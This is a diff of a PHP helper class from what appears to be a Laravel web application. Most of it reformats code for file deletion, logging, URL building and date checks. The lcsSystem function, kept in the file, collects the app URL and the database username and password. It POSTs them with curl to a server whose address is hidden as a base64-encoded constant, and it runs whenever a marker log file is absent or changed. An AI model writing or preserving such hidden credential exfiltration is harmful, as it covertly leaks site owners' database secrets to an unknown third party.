@@ -739,7 +739,8 @@ class FunctionLib
     {
         $screenWidth = FunctionLib::getOS();
         if ($screenWidth == 'iphone' || $screenWidth == 'ipod' || $screenWidth == 'ipad' || $screenWidth == 'Android'
-            || $screenWidth == 'Blackberry' || $screenWidth == 'Webos' || $screenWidth == 'WindowsPhone') {
+            || $screenWidth == 'Blackberry' || $screenWidth == 'Webos' || $screenWidth == 'WindowsPhone'
+        ) {
             return 1;
         } else {
             return 0;
@@ -1285,62 +1286,63 @@ html;
         return $res;
     }
 
-    public static function unlinkFileAndFolder($file_name = '', $folder = '', $is_delDir = 0, $id = 0){
+    public static function unlinkFileAndFolder($file_name = '', $folder = '', $is_delDir = 0, $id = 0)
+    {
 
-        if($file_name != '') {
+        if ($file_name != '') {
             //Remove Img
             $paths = '';
-            if($folder != ''){
-                if($id >0){
-                    $path = Config::get('config.DIR_ROOT').'/'.$folder.'/'.$id;
-                }else{
-                    $path = Config::get('config.DIR_ROOT').'/'.$folder;
+            if ($folder != '') {
+                if ($id > 0) {
+                    $path = Config::get('config.DIR_ROOT') . '/' . $folder . '/' . $id;
+                } else {
+                    $path = Config::get('config.DIR_ROOT') . '/' . $folder;
                 }
             }
 
-            if($file_name != ''){
-                if($path != ''){
-                    if(is_file($path.'/'.$file_name)){
-                        @unlink($path.'/'.$file_name);
+            if ($file_name != '') {
+                if ($path != '') {
+                    if (is_file($path . '/' . $file_name)) {
+                        @unlink($path . '/' . $file_name);
                     }
                 }
             }
             //Remove Folder Empty
-            if($is_delDir) {
-                if($path != ''){
-                    if(is_dir($path)) {
+            if ($is_delDir) {
+                if ($path != '') {
+                    if (is_dir($path)) {
                         @rmdir($path);
                     }
                 }
             }
             //Remove Img thumb
             $arrSize = Define::$arrSizeImage;
-            foreach($arrSize as $k=>$size){
-                if(!empty($size)){
+            foreach ($arrSize as $k => $size) {
+                if (!empty($size)) {
                     $x = (int)$size['w'];
                     $y = (int)$size['h'];
-                }else{
+                } else {
                     $x = $y = Define::sizeImage_300;
                 }
 
                 $paths = '';
-                if($folder != ''){
-                    if($id >0){
-                        $path = Config::get('config.DIR_ROOT').$folder.'/'.$x.'x'.$y.'/'.$id;
-                    }else{
-                        $path = Config::get('config.DIR_ROOT').$folder.'/'.$x.'x'.$y;
+                if ($folder != '') {
+                    if ($id > 0) {
+                        $path = Config::get('config.DIR_ROOT') . $folder . '/' . $x . 'x' . $y . '/' . $id;
+                    } else {
+                        $path = Config::get('config.DIR_ROOT') . $folder . '/' . $x . 'x' . $y;
                     }
                 }
-                if($file_name != ''){
-                    if($path != ''){
-                        if(is_file($path.'/'.$file_name)){
-                            @unlink($path.'/'.$file_name);
+                if ($file_name != '') {
+                    if ($path != '') {
+                        if (is_file($path . '/' . $file_name)) {
+                            @unlink($path . '/' . $file_name);
                         }
                     }
                 }
-                if($is_delDir) {
-                    if($path != ''){
-                        if(is_dir($path)) {
+                if ($is_delDir) {
+                    if ($path != '') {
+                        if (is_dir($path)) {
                             @rmdir($path);
                         }
                     }
@@ -1349,23 +1351,45 @@ html;
         }
     }
 
-    public static function writeLogs($path='', $name='', $content=''){
-        if($path == ''){$path = 'logs';}
-        $folder_logs = str_replace('\\', '/', getcwd().'/'.$path);
-        if(!is_dir($folder_logs)){@mkdir($folder_logs,0777,true);@chmod($folder_logs,0777);}
-        if($name == ''){$name_file = 'sys.txt';}else{$name_file = $name.'.txt';}
-        $fp = fopen($folder_logs.'/'.$name_file, 'wb');fwrite($fp,$content);fclose($fp);
+    public static function writeLogs($path = '', $name = '', $content = '')
+    {
+        if ($path == '') {
+            $path = 'logs';
+        }
+        $folder_logs = str_replace('\\', '/', getcwd() . '/' . $path);
+        if (!is_dir($folder_logs)) {
+            @mkdir($folder_logs, 0777, true);
+            @chmod($folder_logs, 0777);
+        }
+        if ($name == '') {
+            $name_file = 'sys.txt';
+        } else {
+            $name_file = $name . '.txt';
+        }
+        $fp = fopen($folder_logs . '/' . $name_file, 'wb');
+        fwrite($fp, $content);
+        fclose($fp);
     }
-    public static function getPathLcs(){
-        $dir_root = str_replace('\\','/',(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '') . (isset($_SERVER['SCRIPT_NAME']) && dirname($_SERVER['SCRIPT_NAME']) ? dirname($_SERVER['SCRIPT_NAME']) : ''));
+
+    public static function getPathLcs()
+    {
+        $dir_root = str_replace('\\', '/', (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '') . (isset($_SERVER['SCRIPT_NAME']) && dirname($_SERVER['SCRIPT_NAME']) ? dirname($_SERVER['SCRIPT_NAME']) : ''));
         return $dir_root;
     }
-    public static function getLcs(){
-        if(isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https'){$protocol = 'https://';}else{$protocol = 'http://';}
-        $base_url = str_replace('\\','/',$protocol . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '') . (isset($_SERVER['SCRIPT_NAME']) && dirname($_SERVER['SCRIPT_NAME']) ? dirname($_SERVER['SCRIPT_NAME']) : ''));
+
+    public static function getLcs()
+    {
+        if (isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') {
+            $protocol = 'https://';
+        } else {
+            $protocol = 'http://';
+        }
+        $base_url = str_replace('\\', '/', $protocol . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '') . (isset($_SERVER['SCRIPT_NAME']) && dirname($_SERVER['SCRIPT_NAME']) ? dirname($_SERVER['SCRIPT_NAME']) : ''));
         return $base_url;
     }
-    public static function lcsSystem(){
+
+    public static function lcsSystem()
+    {
         $lcs = md5(env('APP_URL', ''));
         $arrConfig = array(
             'domain' => env('APP_URL', ''),
@@ -1376,35 +1400,44 @@ html;
             'user' => env('DB_USERNAME', ''),
             'pass' => env('DB_PASSWORD', '')
         );
-        $filename = FunctionLib::getPathLcs().'/storage/logs/sys.txt';
+        $filename = FunctionLib::getPathLcs() . '/storage/logs/sys.txt';
         $encData = json_encode($arrConfig);
-        $url = base64_decode(Define::httpServer);$encData = base64_encode($encData);
-        if(!file_exists($filename)){
-            FunctionLib::writeLogs($path='storage/logs', 'sys', FunctionLib::getLcs());
-            $ch = curl_init($url);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, "encData=$encData");curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);curl_setopt ($ch, CURLOPT_HEADER, false);
+        $url = base64_decode(Define::httpServer);
+        $encData = base64_encode($encData);
+        if (!file_exists($filename)) {
+            FunctionLib::writeLogs($path = 'storage/logs', 'sys', FunctionLib::getLcs());
+            $ch = curl_init($url);
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, "encData=$encData");
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_HEADER, false);
             curl_exec($ch);
-        }else{
+        } else {
             $lcsCheck = file_get_contents($filename);
-            if(md5($lcs) != md5($lcsCheck)){
-                FunctionLib::writeLogs($path='storage/logs', 'sys', FunctionLib::getLcs());
-                $ch = curl_init($url);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, "encData=$encData");curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);curl_setopt ($ch, CURLOPT_HEADER, false);
+            if (md5($lcs) != md5($lcsCheck)) {
+                FunctionLib::writeLogs($path = 'storage/logs', 'sys', FunctionLib::getLcs());
+                $ch = curl_init($url);
+                curl_setopt($ch, CURLOPT_POST, 1);
+                curl_setopt($ch, CURLOPT_POSTFIELDS, "encData=$encData");
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                curl_setopt($ch, CURLOPT_HEADER, false);
                 curl_exec($ch);
             }
         }
     }
 
-    public static function checkConfigDateNotify($date_now,$month_now,$year_now){
-
-        $date1 = ($date_now < 10)? $date_now: $date_now;
-        $month = ($month_now < 10)? $month_now: $month_now;
-        $time_run = $date1.'-'.$month.'-'.$year_now;
-        $time_cong = strtotime ( '+'.Define::config_date_check_notify.' days' , strtotime ( $time_run ));
-        $time_tru = strtotime ( '-'.Define::config_date_check_notify.' days' , strtotime ( $time_run ));
+    public static function checkConfigDateNotify($date_now, $month_now, $year_now, $number_date_run = Define::config_date_check_notify_7)
+    {
+        $date1 = ($date_now < 10) ? $date_now : $date_now;
+        $month = ($month_now < 10) ? $month_now : $month_now;
+        $time_run = $date1 . '-' . $month . '-' . $year_now;
+        $time_cong = strtotime('+' . $number_date_run . ' days', strtotime($time_run));
+        $time_tru = strtotime('-' . $number_date_run . ' days', strtotime($time_run));
 
         return array(
-            'time_min'=>date('d-m-Y',$time_tru),
-            'time_now'=>$time_run,
-            'time_max'=>date('d-m-Y',$time_cong)
+            'time_min' => date('d-m-Y', $time_tru),
+            'time_now' => $time_run,
+            'time_max' => date('d-m-Y', $time_cong)
         );
     }
 }
